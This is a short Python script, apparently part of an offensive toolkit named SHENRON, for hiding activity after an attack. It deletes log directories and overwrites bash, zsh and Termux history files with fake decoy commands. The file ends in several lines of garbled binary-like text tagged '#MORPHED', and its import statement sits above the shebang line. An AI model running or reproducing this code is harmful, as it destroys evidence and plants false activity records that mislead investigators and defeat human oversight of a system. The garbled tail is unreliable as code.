from core.engine.payload_registry import register_payload

#!/usr/bin/env python3
# anti_forensics_molt.py - SHENRON Forensics Defense Layer

import os
import shutil
from datetime import datetime

LOG_PATHS = [
    "~/.bash_history",
    "~/.zsh_history",
    "/data/data/com.termux/files/home/.bash_history",
    "/data/data/com.termux/files/usr/var/log",
    "~/logs",
]

DECOY_COMMANDS = [
    "echo hello world",
    "cd /storage/emulated/0",
    "ls -la",
    "git clone https://github.com/torvalds/linux",
    "python3 test.py",
    "exit"
]

def expand(path):
    return os.path.expanduser(path)

def nuke_histories():
    for path in LOG_PATHS:
        full_path = expand(path)
        if os.path.exists(full_path):
            try:
                if os.path.isdir(full_path):
                    shutil.rmtree(full_path)
                    print(f"[*] Wiped log directory: {full_path}")
                else:
                    with open(full_path, 'w') as f:
                        decoys = "\n".join(DECOY_COMMANDS)
                        f.write(f"# Cleared on {datetime.now()}\n{decoys}\n")
                        print(f"[*] Injected decoy history: {full_path}")
            except Exception as e:
                print(f"[!] Error handling {full_path}: {e}")

if __name__ == "__main__":
    print("[*] Starting anti-forensics molt...")
    nuke_histories()
    print("[‚úì] Anti-forensics molt completed.")

èÿÏäBëÆLdeß#MORPHED

ÇÈ≥/¶™wîk™˚AÕz_ß
S'Öo∏s#MORPHED

;äπw˚îct¶j{#MORPHED

œµk◊H€Õ+äulc%)]4#MORPHED
